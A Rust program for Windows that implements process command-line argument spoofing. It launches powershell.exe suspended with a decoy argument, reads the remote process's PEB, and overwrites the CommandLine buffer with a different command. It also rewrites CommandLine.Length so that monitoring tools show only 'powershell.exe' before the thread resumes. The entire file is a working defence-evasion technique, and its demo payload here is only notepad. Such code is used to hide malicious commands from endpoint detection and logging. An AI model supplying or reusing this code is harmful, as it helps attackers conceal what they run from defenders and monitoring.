use memoffset::offset_of;
use std::{ffi::c_void, mem::size_of};
use windows::core::{w, PWSTR};
use windows::Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation};
use windows::Win32::Foundation::{CloseHandle, HANDLE, UNICODE_STRING};
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{
    CreateProcessW, ResumeThread, WaitForSingleObject, CREATE_NO_WINDOW, CREATE_SUSPENDED,
    INFINITE, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, RTL_USER_PROCESS_PARAMETERS,
    STARTUPINFOW,
};

fn main() {
    let mut startup_info = STARTUPINFOW::default();
    let mut pi = PROCESS_INFORMATION::default();
    let mut pbi = PROCESS_BASIC_INFORMATION::default();
    let mut ppeb = PEB::default();
    let mut p_params = RTL_USER_PROCESS_PARAMETERS::default();
    let mut return_len: u32 = 0;

    unsafe {
        // Creating a process in suspended mode
        let mut start_argument: Vec<u16> = "powershell.exe args spoofing\0".encode_utf16().collect(); // Command that will perform spoofing
        startup_info.cb = size_of::<STARTUPINFOW>() as u32;

        let _process = CreateProcessW(
            None,
            PWSTR(start_argument.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            None,
            w!("C:\\Windows\\System32\\"),
            &mut startup_info,
            &mut pi,
        ).unwrap_or_else(|e| {
            panic!("[!] CreateProcessW Failed With Error: {e}");
        });

        println!("[+] DONE!");
        println!("[+] Target PID Process: {}", pi.dwProcessId);

        let hprocess = pi.hProcess;
        let hthread = pi.hThread;

        // Retrieving PEB address
        NtQueryInformationProcess(
            hprocess,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        );

        println!("[+] Adress to PEB: {:?}", pbi.PebBaseAddress);

        // Reading the PEB address
        ReadProcessMemory(
            hprocess,
            pbi.PebBaseAddress as *const c_void,
            &mut ppeb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            None,
        ).unwrap_or_else(|e| {
            clear(hprocess, hthread);
            panic!("[!] ReadProcessMemory (1) Failed With Error: {e}");
        });

        // Reading the RTL_USER_PROCESS_PARAMETERS structure from the remote process's PEB
        ReadProcessMemory(
            hprocess,
            ppeb.ProcessParameters as *const c_void,
            &mut p_params as *mut _ as *mut c_void,
            size_of::<RTL_USER_PROCESS_PARAMETERS>() + 255,
            None,
        ).unwrap_or_else(|e| {
            clear(hprocess, hthread);
            panic!("[!] ReadProcessMemory (2) Failed With Error: {e}");
        });

        // Changing the Buffer value for the actual command
        let reajust_argument: Vec<u16> = "powershell.exe -NoExit notepad.exe\0"
            .encode_utf16()
            .collect();

        WriteProcessMemory(
            hprocess,
            p_params.CommandLine.Buffer.as_ptr() as _,
            reajust_argument.as_ptr() as _,
            reajust_argument.len() * size_of::<u16>() + 1,
            None,
        ).unwrap_or_else(|e| {
            clear(hprocess, hthread);
            panic!("[!] WriteProcessMemory (1) Failed With Error: {e}");
        });

        // Changing the size of CommandLine.Length
        let new_len_power: usize = "powershell.exe\0".encode_utf16().count() * size_of::<u16>();
        let offset = ppeb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
        WriteProcessMemory(
            hprocess,
            offset as _,
            &new_len_power as *const _ as *const c_void,
            size_of::<u32>(),
            None,
        ).unwrap_or_else(|e| {
            clear(hprocess, hthread);
            panic!("[!] WriteProcessMemory (2) Failed With Error: {e}");
        });

        println!("[+] Thread Executed!!");

        // Resuming the Thread for execution
        ResumeThread(hthread);
        WaitForSingleObject(hthread, INFINITE);

        clear(hprocess, hthread)
    }
}

#[allow(unused_must_use)]
fn clear(hprocess: HANDLE, hthread: HANDLE) {
    unsafe {
        CloseHandle(hprocess);
        CloseHandle(hthread);
    };
}
